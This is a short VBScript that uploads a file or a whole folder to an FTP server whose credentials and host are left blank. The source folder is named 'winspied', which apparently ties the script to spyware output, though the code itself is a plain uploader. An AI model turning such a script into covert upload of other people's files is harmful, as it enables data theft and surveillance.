Set oShell = CreateObject("Shell.Application")
Set objFSO = CreateObject("Scripting.FileSystemObject")

path = "c:\Users\aw\Desktop\winspied\ELVIS\"

FTPUpload(path)
Sub FTPUpload(path)

On Error Resume Next

Const copyType = 16

'FTP Wait Time in ms
waitTime = 80000

FTPUser = ""
FTPPass = ""
FTPHost = ""
FTPDir = ""

strFTP = "ftp://" & FTPUser & ":" & FTPPass & "@" & FTPHost & FTPDir
Set objFTP = oShell.NameSpace(strFTP)


'Upload single file       
If objFSO.FileExists(path) Then

Set objFile = objFSO.getFile(path)
strParent = objFile.ParentFolder
Set objFolder = oShell.NameSpace(strParent)

Set objItem = objFolder.ParseName(objFile.Name)

Wscript.Echo "Uploading file " & objItem.Name & " to " & strFTP
 objFTP.CopyHere objItem, copyType


End If


'Upload all files in folder
If objFSO.FolderExists(path) Then

'Entire folder
Set objFolder = oShell.NameSpace(path)

Wscript.Echo "Uploading folder " & path & " to " & strFTP
objFTP.CopyHere objFolder.Items, copyType

End If


If Err.Number <> 0 Then
Wscript.Echo "Error: " & Err.Description
End If

'Wait for upload
Wscript.Sleep waitTime

End Sub
